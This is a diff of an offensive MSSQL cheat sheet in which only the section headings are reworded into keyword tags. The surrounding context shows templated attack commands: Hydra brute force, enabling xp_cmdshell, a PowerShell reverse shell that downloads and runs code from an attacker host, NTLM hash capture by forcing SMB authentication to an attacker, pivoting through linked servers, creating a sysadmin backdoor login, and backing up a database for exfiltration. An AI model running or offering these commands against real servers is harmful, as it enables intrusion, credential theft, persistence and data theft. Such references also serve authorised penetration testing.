@@ -4,7 +4,7 @@
 
 ---
 
-## Nmap MSSQL Scripts
+## scan mssql nmap nse
 Enumerate MSSQL instance with NSE scripts for info, config, and weak auth.
 
 ```bash
@@ -15,7 +15,7 @@ nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p {{PORT:port:143
 
 ---
 
-## Brute Force Credentials with Hydra
+## brute login mssql hydra
 Brute force MSSQL logins with username and password lists.
 
 ```bash
@@ -26,7 +26,7 @@ hydra -L {{USERS_FILE:file:users.txt}} -P {{PASSWORDS_FILE:file:passwords.txt}} 
 
 ---
 
-## Connect with sqlcmd (Windows)
+## connect sqlcmd windows
 Authenticate to MSSQL using built-in Windows sqlcmd utility.
 
 ```bash
@@ -37,7 +37,7 @@ sqlcmd -S {{TARGET:ip}} -U {{USERNAME:str:sa}} -P {{PASSWORD:str}}
 
 ---
 
-## Connect with sqsh (Linux)
+## connect sqsh linux
 Connect from Linux client to MSSQL with sqsh.
 
 ```bash
@@ -48,7 +48,7 @@ sqsh -S {{TARGET:ip}} -U {{USERNAME:str}} -P {{PASSWORD:str}} -D {{DATABASE:str:
 
 ---
 
-## Connect with impacket-mssqlclient (Windows Auth)
+## connect impacket windows-auth
 Connect using domain credentials with Windows authentication.
 
 ```bash
@@ -59,7 +59,7 @@ impacket-mssqlclient -port {{PORT:port:1433}} {{DOMAIN:domain}}/{{USERNAME:str}}
 
 ---
 
-## Get Version and Current User
+## get version whoami
 Inspect server version and authenticated context.
 
 ```sql
@@ -72,7 +72,7 @@ SELECT system_user;
 
 ---
 
-## List Databases and Tables
+## list databases tables
 Enumerate databases and tables on the server.
 
 ```sql
@@ -85,7 +85,7 @@ SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
 
 ---
 
-## Enumerate Server Principals (Logins)
+## enum logins server principals
 List server-level principals including disabled accounts.
 
 ```sql
@@ -96,7 +96,7 @@ SELECT name, type_desc, is_disabled FROM sys.server_principals;
 
 ---
 
-## Check Current Permissions
+## check current permissions
 List permissions granted to current user at server scope.
 
 ```sql
@@ -107,7 +107,7 @@ SELECT permission_name FROM fn_my_permissions(NULL, 'SERVER');
 
 ---
 
-## Enable xp_cmdshell
+## enable xp_cmdshell
 Reconfigure server to allow OS command execution.
 
 ```sql
@@ -119,7 +119,7 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
 ---
 
-## Run OS Command via xp_cmdshell
+## exec os command xp_cmdshell
 Execute Windows command and return output.
 
 ```sql
@@ -130,7 +130,7 @@ EXEC xp_cmdshell '{{COMMAND:str:whoami}}';
 
 ---
 
-## PowerShell Reverse Shell via xp_cmdshell
+## reverse shell powershell xp_cmdshell
 Spawn PowerShell reverse shell from MSSQL.
 
 ```sql
@@ -141,7 +141,7 @@ EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New
 
 ---
 
-## Enumerate Linked Servers
+## enum linked servers
 List linked servers for lateral movement opportunities.
 
 ```sql
@@ -153,7 +153,7 @@ SELECT * FROM sys.servers;
 
 ---
 
-## Execute Command on Linked Server
+## pivot exec linked server
 Run xp_cmdshell on a linked server to pivot.
 
 ```sql
@@ -164,7 +164,7 @@ EXEC ('EXEC xp_cmdshell ''whoami''') AT [{{LINKED_SERVER:str}}];
 
 ---
 
-## List Directory with xp_dirtree
+## list directory xp_dirtree
 Enumerate filesystem directories (also useful for NTLM hash capture via UNC).
 
 ```sql
@@ -175,7 +175,7 @@ EXEC master..xp_dirtree '{{PATH:str:C:\Users\}}';
 
 ---
 
-## NTLM Hash Capture via UNC Path
+## capture NTLM hash UNC coerce
 Force MSSQL to authenticate to attacker SMB server.
 
 ```sql
@@ -186,7 +186,7 @@ EXEC master..xp_dirtree '\\{{LHOST:ip}}\share';
 
 ---
 
-## Create sysadmin Backdoor
+## create sysadmin backdoor login
 Create a backdoor login with sysadmin role.
 
 ```sql
@@ -198,7 +198,7 @@ ALTER SERVER ROLE sysadmin ADD MEMBER {{USERNAME:str:backdoor}};
 
 ---
 
-## Backup Database for Exfil
+## backup database exfil
 Backup database to disk for offline data exfil.
 
 ```bash
@@ -209,7 +209,7 @@ sqlcmd -S {{TARGET:ip}} -U {{USERNAME:str}} -P {{PASSWORD:str}} -Q "BACKUP DATAB
 
 ---
 
-## Read Error Log for Sensitive Data
+## read error log sensitive
 Inspect SQL Server error log (may contain credentials).
 
 ```sql
@@ -220,7 +220,7 @@ EXEC xp_readerrorlog;
 
 ---
 
-## Enable CLR Integration
+## enable CLR integration rce
 Enable CLR for executing custom .NET assemblies on the server.
 
 ```sql
@@ -231,7 +231,7 @@ EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
 
 ---
 
-## Impacket - Enable xp_cmdshell from Shell
+## exec xp_cmdshell impacket helpers
 Run convenience helpers from impacket-mssqlclient session.
 
 ```bash
